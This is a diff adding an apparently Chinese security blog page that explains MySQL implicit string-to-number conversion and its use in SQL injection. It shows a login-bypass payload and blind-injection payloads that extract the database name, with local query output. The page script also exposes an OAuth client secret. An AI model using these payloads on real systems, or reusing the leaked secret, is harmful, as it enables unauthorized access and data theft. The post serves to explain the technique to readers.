@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        MySQL类型转换 - Daybreak&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> sometimes code, sometimes hack. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/Daybreak.png" />
+        </div>
+        <div class="name">
+            <i>Daybreak</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL类型转换"><span class="toc-text">MySQL类型转换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL类型转换在注入中的运用"><span class="toc-text">MySQL类型转换在注入中的运用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> sometimes code, sometimes hack. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        MySQL类型转换
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2018-12-11 15:44:14</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#MySQL" title="MySQL">MySQL</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在研究Fuzzing技术时览到了<a href="https://www.freebuf.com/articles/web/190019.html" target="_blank" rel="noopener">SQL注入常规Fuzz全记录</a>这样一片文章。文中所利用的注入payload引起了我的关注，于是开始研究这个payload的原理。</p>
+<h2 id="MySQL类型转换"><a href="#MySQL类型转换" class="headerlink" title="MySQL类型转换"></a>MySQL类型转换</h2><p>文中所利用的payload为<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'-(<span class="built_in">length</span>(passwd)=<span class="number">48</span>)-<span class="string">'</span></span><br></pre></td></tr></table></figure></p>
+<p>这里我本地进行测试<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(database()); </span><br><span class="line"><span class="code">+--------------------+</span></span><br><span class="line">| length(database()) |</span><br><span class="line"><span class="code">+--------------------+</span></span><br><span class="line">|                  4 |</span><br><span class="line"><span class="code">+--------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from aaa where admin=<span class="emphasis">'admin'</span>-(length(database())=1) and passwd=<span class="emphasis">'admin'</span>;</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">| id | admin | passwd |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">|  1 | admin | admin  |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">1 row in set, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from aaa where admin=<span class="emphasis">'admin'</span>-(length(database())=4) and passwd=<span class="emphasis">'admin'</span>;</span><br><span class="line">Empty set, 2 warnings (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>从上述执行结果可以看到数据库名的长度为4。当插入该payload为false时，结果为true，而插入payload为true时结果为warnings。<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'admin'</span>-<span class="comment">(length(database()</span>)=<span class="number">1</span>)  <span class="comment">//返回ture</span></span><br><span class="line"><span class="string">'admin'</span>-<span class="comment">(length(database()</span>)=<span class="number">4</span>) <span class="comment">//返回false</span></span><br></pre></td></tr></table></figure></p>
+<p>为了更好的理解简化payload进行测试<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="emphasis">'admin'</span>-4;</span><br><span class="line"><span class="code">+-----------+</span></span><br><span class="line">| <span class="emphasis">'admin'</span>-4 |</span><br><span class="line"><span class="code">+-----------+</span></span><br><span class="line">|        -4 |</span><br><span class="line"><span class="code">+-----------+</span></span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select <span class="emphasis">'4admin'</span>-4;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| <span class="emphasis">'4admin'</span>-4 |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|          0 |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>这里可以看到当运算符与不同类型的操作数一起使用时，会发生类型转换。这里做运算时admin被转化成了0，4admin被转化为4。</p>
+<p>为了进一步理解该类型转换的具体原理，进而查阅了<a href="https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html" target="_blank" rel="noopener">MySQL的官方文档</a>。可以看到官方文档的描述如下：</p>
+<p>当运算符与不同类型的操作数一起使用时，会发生类型转换以使操作数兼容。某些转换是隐式发生的。例如，MySQL会根据需要自动将字符串转换为数字，反之亦然。隐式转化规则如下：</p>
+<p>1、两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 &lt;=&gt; 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换。</p>
+<p>2、两个参数都是字符串，会按照字符串来比较，不做类型转换。</p>
+<p>3、两个参数都是整数，按照整数来比较，不做类型转换。</p>
+<p>4、十六进制的值和非数字做比较时，会被当做二进制串。</p>
+<p>5、有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp。</p>
+<p>6、有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较。</p>
+<p>7、所有其他情况下，两个参数都会被转换为浮点数再进行比较。</p>
+<p>这也就解释了该payload语句形成的原因——在输入的vchar类型操作数与int型的操作数做减法运算时发生了隐士转化，vchar类型的操作数被转换成了数字进行运算。</p>
+<p>进一步测试：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="emphasis">'1x'</span> = 1;</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">| <span class="emphasis">'1x'</span> = 1 |</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">|        1 |</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select <span class="emphasis">'1x2c'</span> = 1;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| <span class="emphasis">'1x2c'</span> = 1 |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|          1 |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select <span class="emphasis">'a1x2c'</span> = 1;</span><br><span class="line"><span class="code">+-------------+</span></span><br><span class="line">| <span class="emphasis">'a1x2c'</span> = 1 |</span><br><span class="line"><span class="code">+-------------+</span></span><br><span class="line">|           0 |</span><br><span class="line"><span class="code">+-------------+</span></span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select <span class="emphasis">'a1x2c'</span> = 2;</span><br><span class="line"><span class="code">+-------------+</span></span><br><span class="line">| <span class="emphasis">'a1x2c'</span> = 2 |</span><br><span class="line"><span class="code">+-------------+</span></span><br><span class="line">|           0 |</span><br><span class="line"><span class="code">+-------------+</span></span><br><span class="line">1 row in set, 1 warning (0.01 sec)</span><br></pre></td></tr></table></figure></p>
+<p>从这些例子可以看出,当把字符串转为数字的时候，是从左边开始处理的。总结规则如下</p>
+<p>1、如果字符串的第一个字符就是非数字的字符，那么转换为数字就是0</p>
+<p>2、如果字符串以数字开头，那么转换时就将字符串开头的数字作为转换结果。如：132axc就会转换为132。</p>
+<p>3、如果字符串中都是数字，那么转换为数字就是整个字符串对应的数字。</p>
+<h2 id="MySQL类型转换在注入中的运用"><a href="#MySQL类型转换在注入中的运用" class="headerlink" title="MySQL类型转换在注入中的运用"></a>MySQL类型转换在注入中的运用</h2><p>SQL注入利用一：<br>这里引用<a href="https://www.t00ls.net/thread-48821-1-1.html" target="_blank" rel="noopener">t00ls师傅的一片文章</a>。<br>文中描述的是过狗万能密码。其原理就是应用自动转换机制进行构造的。<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from aaa;</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+------------+</span></span><br><span class="line">| id | admin | passwd     |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+------------+</span></span><br><span class="line">|  1 | admin | admin      |</span><br><span class="line">|  2 | 1     | 1alert"&gt;&lt;" |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+------------+</span></span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from aaa where admin=<span class="emphasis">'xx'</span>=0 limit 0,1 -- and passwd=<span class="emphasis">'xxx'</span>;</span><br><span class="line"><span class="code">    -&gt; ;</span></span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">| id | admin | passwd |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">|  1 | admin | admin  |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到’xx’与0比较，xx被隐式转化为了0，0=0，此时会显示全部结果，然而利用limit控制返回一条数据。成功执行。</p>
+<p>SQL注入利用二：<br>利用该方法进行盲注。通过开始执行的payload我们可以根据结果来进行判断。<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">| length(database())=4 |</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">|                    1 |</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select length(database())=1;</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">| length(database())=1 |</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">|                    0 |</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到等式成立返回1，等式不成立返回0。<br>利用方式如下：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from aaa where admin=<span class="emphasis">'xxx'</span>-(length(database())=4);</span><br><span class="line">Empty set, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from aaa where admin=<span class="emphasis">'xxx'</span>-(length(database())=1);</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">| id | admin | passwd |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">|  1 | admin | admin  |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">1 row in set, 2 warnings (0.01 sec)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到第一条数据返回结果为admin=-4,第二条返回的结果为admin=0。然后mysql会取表中与0相同的数据。由于隐形转化的结果，所有字符串开头的都会被匹配。<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into aaa(admin,passwd) values(<span class="emphasis">'xxx'</span>,<span class="emphasis">'aaa'</span>);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from aaa;</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+------------+</span></span><br><span class="line">| id | admin | passwd     |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+------------+</span></span><br><span class="line">|  1 | admin | admin      |</span><br><span class="line">|  2 | 1     | 1alert"&gt;&lt;" |</span><br><span class="line">|  3 | xxx   | aaa        |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+------------+</span></span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from aaa where admin=0;</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">| id | admin | passwd |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">|  1 | admin | admin  |</span><br><span class="line">|  3 | xxx   | aaa    |</span><br><span class="line"><span class="code">+----+</span>-------<span class="code">+--------+</span></span><br><span class="line">2 rows in set, 2 warnings (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>利用这样的思路构造盲注语句<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span><span class="built_in"> aaa </span>where <span class="attribute">admin</span>=<span class="string">'asd'</span>-(ascii((substr(database(),1,1)))=116);</span><br><span class="line">Empty set, 3 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span><span class="built_in"> aaa </span>where <span class="attribute">admin</span>=<span class="string">'asd'</span>-(ascii((substr(database(),1,1)))=111);</span><br><span class="line">+----+-------+--------+</span><br><span class="line">| id | admin | passwd |</span><br><span class="line">+----+-------+--------+</span><br><span class="line">|  1 | admin | admin  |</span><br><span class="line">|  3 | xxx   |<span class="built_in"> aaa </span>   |</span><br><span class="line">+----+-------+--------+</span><br><span class="line">2 rows <span class="keyword">in</span> set, 3 warnings (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果有其他利用的思路希望各位大佬补充。</p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/pay.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/daybr4ak">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="http://pupiles.com">pupil</a></span>
+        <span>/</span>
+        
+        <span><a href="https://www.cnblogs.com/test404/">胖虎</a></span>
+        <span>/</span>
+        
+        <span><a href="https://gloxec.github.io/">hook</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            总访问量
+            <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+            总访客
+            <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script src="/js/gitment.js"></script>
+<script>
+    var gitment = new Gitment({
+        id: 'MySQL类型转换',
+        owner: 'Daybr4ak',
+        repo: 'Daybr4ak.github.io',
+        oauth: {
+            client_id: '8b74f097fa60ac743b82',
+            client_secret: '837baf77a88f3c0535b7cdf4790e047666c565fb',
+        },
+    })
+    gitment.render('comment-container')
+</script>
+
+
+
+
+</html>
